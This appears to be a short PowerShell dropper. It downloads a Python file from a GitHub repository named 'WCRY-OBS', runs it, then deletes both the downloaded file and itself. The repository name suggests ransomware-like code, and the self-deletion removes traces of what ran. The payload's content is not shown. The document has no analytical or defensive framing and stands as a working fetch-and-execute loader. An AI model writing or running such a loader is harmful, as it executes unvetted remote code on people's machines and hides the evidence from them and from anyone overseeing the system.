$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
wget -Uri $url
$scriptName = $MyInvocation.MyCommand.Name
echo $scriptName
python3 Oshawott.py
Remove-Item "Oshawott.py"
Remove-Item $scriptName